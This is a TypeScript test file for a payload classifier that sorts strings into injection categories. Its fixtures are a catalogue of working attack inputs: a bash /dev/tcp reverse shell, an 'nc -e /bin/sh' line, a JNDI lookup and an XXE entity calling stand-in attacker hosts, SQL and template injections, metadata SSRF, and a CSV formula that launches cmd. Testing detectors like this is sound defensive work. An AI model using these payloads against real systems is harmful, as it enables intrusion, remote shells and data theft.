import { describe, expect, test } from "bun:test"
import { classifyPayload } from "./classify"
import { PAYLOAD_KINDS, type PayloadKind } from "./types"

const DOLLAR = "$"
const JNDI_LDAP = `${DOLLAR}{jndi:ldap://evil.example.com/a}`
const JNDI_LDAP_PORT = `${DOLLAR}{jndi:ldap://evil.example.com:1389/a}`
const EL_EXPRESSION = `${DOLLAR}{7*7}`

const SINGLE_KIND_CASES: readonly (readonly [string, PayloadKind])[] = [
  ["<script>alert(document.cookie)</script>", "xss"],
  ["<img src=x onerror=alert(1)>", "xss"],
  ["' OR 1=1 -- -", "sqli"],
  ["UNION SELECT username, password FROM users", "sqli"],
  ["1' AND SLEEP(5)-- -", "sqli"],
  ["{{7*7}}", "ssti"],
  ["{{config.items()}}", "ssti"],
  [EL_EXPRESSION, "ssti"],
  ["../../../../etc/passwd", "lfi"],
  ["php://filter/convert.base64-encode/resource=index.php", "lfi"],
  [JNDI_LDAP, "ldap"],
  ["(?uid=*)(|(uid=*))", "ldap"],
  ["bash -i >& /dev/tcp/10.10.14.1/9001 0>&1", "rce"],
  ["nc -e /bin/sh 10.0.0.1 4444", "rce"],
  ["php -r 'system($_GET[0]);'", "rce"],
  ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "xxe"],
  ['<!DOCTYPE r [<!ENTITY a SYSTEM "http://attacker.example.com/evil.dtd">]>', "xxe"],
  ["http://169.254.169.254/latest/meta-data/", "ssrf"],
  ["http://127.0.0.1:8080/admin", "ssrf"],
  ["gopher://127.0.0.1:6379/_INFO", "ssrf"],
  ["//evil.example.com/", "open-redirect"],
  ["https:\\\\evil.example.com", "open-redirect"],
  ["%0d%0aSet-Cookie:%20crlf=1", "crlf"],
  ["/login?next=x%0d%0aX-Injected:%201", "crlf"],
  ["X-Forwarded-For: 127.0.0.1", "header"],
  ['=cmd|" /C calc"!A0', "csv-injection"],
  ["@SUM(1+1)*cmd|' /C calc'!A0", "csv-injection"],
  ['{"username": {"$ne": null}}', "nosql"],
  ["'; return true; var foo='", "nosql"],
  ["query { __schema { types { name } } }", "graphql"],
  ["{ __typename }", "graphql"],
  ["; cat /etc/passwd", "command-injection"],
  ["$(whoami)", "command-injection"],
  ["| ping -c 1 10.0.0.1", "command-injection"],
]

const NON_KIND_CASES: readonly (readonly [string, PayloadKind])[] = [
  ["administrator", "wordlist"],
  ["backup-2024", "wordlist"],
  ["P@ssw0rd", "wordlist"],
  ["the quick brown fox jumped over the lazy dog", "other"],
  ["", "other"],
  ["   ", "other"],
  ["12345", "other"],
  ["a", "other"],
]

describe("classifyPayload kind recognition", () => {
  describe("#given a payload carrying one recognizable signal", () => {
    test("#when it is classified #then it maps onto the signal's kind", () => {
      const mismatches = SINGLE_KIND_CASES.flatMap(([payload, expected]) => {
        const actual = classifyPayload(payload)
        return actual === expected ? [] : [`${JSON.stringify(payload)}: expected ${expected}, got ${actual}`]
      })

      expect(mismatches).toEqual([])
    })
  })

  describe("#given a string that is not an injection payload", () => {
    test("#when it is classified #then it is a wordlist entry or other rather than a guess", () => {
      const mismatches = NON_KIND_CASES.flatMap(([payload, expected]) => {
        const actual = classifyPayload(payload)
        return actual === expected ? [] : [`${JSON.stringify(payload)}: expected ${expected}, got ${actual}`]
      })

      expect(mismatches).toEqual([])
    })
  })
})

describe("classifyPayload precedence", () => {
  describe("#given a body carrying an XML declaration and a traversal path", () => {
    test("#when it is classified #then xxe outranks lfi because the document type is explicit", () => {
      const payload =
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///../../etc/passwd">]><foo>&xxe;</foo>'

      expect(classifyPayload(payload)).toBe("xxe")
      expect(classifyPayload(payload)).not.toBe("lfi")
    })
  })

  describe("#given a JNDI lookup that also carries a template delimiter", () => {
    test("#when it is classified #then ldap outranks ssti because a protocol is named", () => {
      const payload = JNDI_LDAP_PORT

      expect(classifyPayload(payload)).toBe("ldap")
      expect(classifyPayload(payload)).not.toBe("ssti")
    })
  })

  describe("#given a forwarded-for header whose value is a metadata address", () => {
    test("#when it is classified #then header outranks ssrf because the field name leads the line", () => {
      const payload = "X-Forwarded-For: 169.254.169.254"

      expect(classifyPayload(payload)).toBe("header")
      expect(classifyPayload(payload)).not.toBe("ssrf")
    })
  })

  describe("#given a traversal into a sensitive file behind a shell separator", () => {
    test("#when it is classified #then command-injection outranks lfi because the command is bound", () => {
      const payload = "1; cat /etc/passwd"

      expect(classifyPayload(payload)).toBe("command-injection")
      expect(classifyPayload(payload)).not.toBe("lfi")
    })
  })

  describe("#given a spreadsheet formula that also opens a shell pipe", () => {
    test("#when it is classified #then csv-injection outranks command-injection because it leads the line", () => {
      const payload = '=cmd|" /C calc"!A0'

      expect(classifyPayload(payload)).toBe("csv-injection")
      expect(classifyPayload(payload)).not.toBe("command-injection")
    })
  })

  describe("#given a Mongo operator carrying a SQL-looking tautology", () => {
    test("#when it is classified #then nosql outranks sqli because the operator has a dollar name", () => {
      const payload = '{"$where": "\' OR 1=1" }'

      expect(classifyPayload(payload)).toBe("nosql")
      expect(classifyPayload(payload)).not.toBe("sqli")
    })
  })

  describe("#given a scheme-relative host that no other rule claims", () => {
    test("#when it is classified #then open-redirect is the answer rather than other", () => {
      const payload = "//attacker.example.com/path"

      expect(classifyPayload(payload)).toBe("open-redirect")
      expect(classifyPayload(payload)).not.toBe("other")
    })
  })

  describe("#given a reverse shell one-liner that also names a private address", () => {
    test("#when it is classified #then rce outranks ssrf because an interpreter is invoked", () => {
      const payload = "bash -i >& /dev/tcp/10.10.14.1/9001 0>&1"

      expect(classifyPayload(payload)).toBe("rce")
      expect(classifyPayload(payload)).not.toBe("ssrf")
    })
  })
})

describe("classifyPayload totality", () => {
  describe("#given arbitrary strings including payloads and prose", () => {
    test("#when each is classified #then every answer is a declared PayloadKind and never throws", () => {
      const inputs = [
        ...SINGLE_KIND_CASES.map(([payload]) => payload),
        ...NON_KIND_CASES.map(([payload]) => payload),
        "\u0000\u0001\u0002",
        "\u00a7VAR\u00a7",
        "{{ unclosed",
        "<script>unterminated",
        "%",
        "$$$$",
        "x".repeat(5000),
      ]

      for (const input of inputs) {
        const kind = classifyPayload(input)
        expect(PAYLOAD_KINDS as readonly string[]).toContain(kind)
      }
    })

    test("#when the same input is classified twice #then both answers agree", () => {
      for (const [payload] of SINGLE_KIND_CASES) {
        expect(classifyPayload(payload)).toBe(classifyPayload(payload))
      }
    })
  })
})
